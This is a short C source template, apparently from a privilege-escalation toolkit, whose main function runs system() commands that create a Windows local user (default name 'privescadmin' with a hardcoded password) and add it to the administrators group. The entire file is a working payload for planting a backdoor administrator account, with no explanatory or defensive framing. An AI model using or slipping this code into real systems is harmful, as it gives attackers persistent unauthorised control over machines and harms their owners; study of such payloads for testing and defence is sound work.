#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user {{ username | default('privescadmin') }} {{ password | default('privescpass123!') }} /add");
  i = system ("net localgroup administrators {{ username | default('privescadmin') }} /add");
  
  return 0;
}
